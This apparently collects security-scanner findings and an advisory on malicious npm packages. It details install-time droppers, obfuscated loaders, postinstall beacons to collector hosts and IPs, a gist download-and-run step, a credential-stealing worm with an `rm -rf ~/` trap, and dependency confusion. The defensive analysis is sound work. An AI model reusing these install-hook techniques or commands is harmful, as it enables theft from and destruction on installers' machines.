## Source: amazon-inspector (7bf1dbafca56ccfcb849f9ebb80b7a1cdf42007fd12618492620e0f7660476b2)
The package has no native source files but ships a binding.gyp whose sole target is type:'none' and whose sources array uses GYP command expansion (`<!(env node index.js...)`) to execute index.js during `node-gyp rebuild`, which npm invokes automatically whenever a binding.gyp is present. index.js is a Caesar-cipher-obfuscated IIFE whose decoded body imports node:crypto, reads the shipped data.bin blob, AES-128-GCM-decrypts it with hardcoded key/iv/aad, brotli-decompresses the result into a temporary file, and spawns that file under the Bun runtime (declared as the package's only dependency). The combination — binding.gyp with no native sources used purely as an install-time execution smuggler, an obfuscated eval-based loader, and an opaque encrypted payload executed under an alternate runtime — is a packed dropper with no legitimate function for a stated utility library.

## Source: amazon-inspector (8608133ab1a2f106c095f84116cd25fa141208dbf81ea6fe2331e38a88551a4b)
The package ships a binding.gyp whose `sources` field uses GYP command-expansion (`<!(env node index.js...)`) with no native source files, causing npm's implicit `node-gyp rebuild` to execute index.js at install time. index.js is a Caesar+10 (ROT) obfuscated eval blob that, once decoded, AES-128-GCM-decrypts a hardcoded hex ciphertext and the sibling `data.bin`, brotli-decompresses the result, writes it to a mkdtemp'd temporary file, and spawns it under Bun (`Bun.spawn([execPath,'run',tmp])` / `spawn(getBunPath(),['run',tmp])`). package.json declares `bun` as a runtime dependency, deliberately routing execution through an alternate runtime rather than Node. The executed payload is fully opaque and attacker-controlled. The combination of a no-source binding.gyp used solely as a lifecycle trigger, multi-layer obfuscation (ROT + AES-GCM + brotli), and alternate-runtime dispatch has no legitimate native-build justification.

## Source: amazon-inspector (d984cf27dec602e96199a4361b485f0a7c79e2134977a355d42ddb46edd606d0)
simplewave@0.0.2 declares a postinstall script in package.json that runs an inline Node command performing an HTTP GET to a subdomain of oast.fun with the installer's os.hostname() embedded as the leftmost DNS label. oast.fun is the public Interactsh out-of-band interaction server, used to receive exfiltrated data via DNS/HTTP callbacks. The beacon fires unconditionally on npm install, with no caller consent or configuration. The shipped index.js is a trivial stub providing no advertised functionality, so the manifest-level beacon is the package's entire effect. The host identifier of every machine that installs the package is delivered to a third-party OOB collector controlled by whoever provisioned the oast.fun subdomain token.

## Source: amazon-inspector (25577370189f57a5678b2f2c45e212abfc79a3675dc7d51581f633e78aba47a6)
package.json declares `preinstall: sh./prepare.js && exit 0`. prepare.js is shaped like JavaScript (ending with `console.log('hello world')`) but is executed by /bin/sh, which does not treat `/**... */` as a comment. Inside that block, sh evaluates two `$(...)` command substitutions: one issues a GET to the hardcoded collector https://webhook.site/9e8c8742-3102-4716-aa8b-e150e9e84fe7/stats_1, and the other downloads https://api.github.com/gists/da04f14c93acbe9a7aef827be0a2e91c, extracts a file via jq, writes it to disk as `x`, and runs it with `sh x`. On `npm install`, the installer host fetches and executes arbitrary, unpinned, attacker-controlled content from a mutable GitHub Gist, and the webhook.site beacon discloses the install (and curl-visible metadata such as public IP and user-agent) to the attacker. The JS-comment-wrapping of the shell payload is a deliberate cover story so prepare.js reads as a trivial hello-world when viewed as JavaScript.

## Source: amazon-inspector (f20036e315be6c5dd925bdedc87120af27adb007a4c2b6653c95cb386acd9009)
On install, package.json's postinstall hook runs install.js, which invokes `npm install @conduit/logview-cli@2.2.0 --registry <URL>` where the registry URL is stored as a base64+XOR-masked string in lib/toolchain.json and decoded in memory by lib/origin.js (XOR key `c0ndu1t-ops`). The decoded destination is a plain-HTTP bare IP (http://139.196.94.195:8080/dl/npm/), not the public npm registry, a known publisher host, or an internal-DNS name consistent with the package's self-claimed `conduit.internal` provenance. npm will fetch and execute the lifecycle scripts of whatever package the attacker serves at that endpoint, giving arbitrary install-time code execution on the installer's host. A comment in lib/origin.js states the masking is intended so the downloaded package `carries no readable address`, confirming the concealment is deliberate rather than incidental.

data-pipeline-testmetest 2.0.1 is a self-spreading credential stealer that runs on `npm install` without an install script: its `binding.gyp` source `<!(env node index.js >/dev/null 2>&1; echo stub.c)` makes node-gyp run `index.js`, an obfuscated loader that decrypts a 939 KB payload and pipes it into Bun (downloaded from GitHub if missing). The payload steals GitHub, npm, PyPI, RubyGems and cloud credentials, commits them to a public repository it creates in the victim's GitHub account (description `project-utils`), and republishes the victim's packages with the same hook. Published by npm account `testnewtestme2` on 2026-10-21.

If it finds a GitHub token it installs a `net-health-checker` user service that runs `rm -rf ~/` once the token is revoked. Remove `~/.local/bin/net-health-checker.sh` and its systemd unit or LaunchAgent before revoking the token, then rotate all reachable credentials.

The package's npm postinstall hook automatically executes on install and transmits installer-identifying data to a hardcoded remote endpoint. It collects os.hostname(), the local username, platform/arch, Node version, package name, and a nonce, base64-encodes the payload, and sends it as a `d=` query parameter via plain-HTTP GET to http://34.143.131.27:18080/x-VA-1/main.js (overridable only via a DEPCONF_CALLBACK_URL env var that defaults to this hardcoded bare IP). A DNS beacon fallback to a configurable collaborator suffix is also issued. The package name (`@securihackbot/depconf-stage-...`) and bundled configure.sh workflow are structured to be re-published under victim-internal scopes so that `npm install` of an internal package name resolves to this artifact from the public registry, at which point the postinstall beacon fires and leaks the host, user, and internal package name back to the operator — a dependency-confusion attack payload against any environment that resolves it.
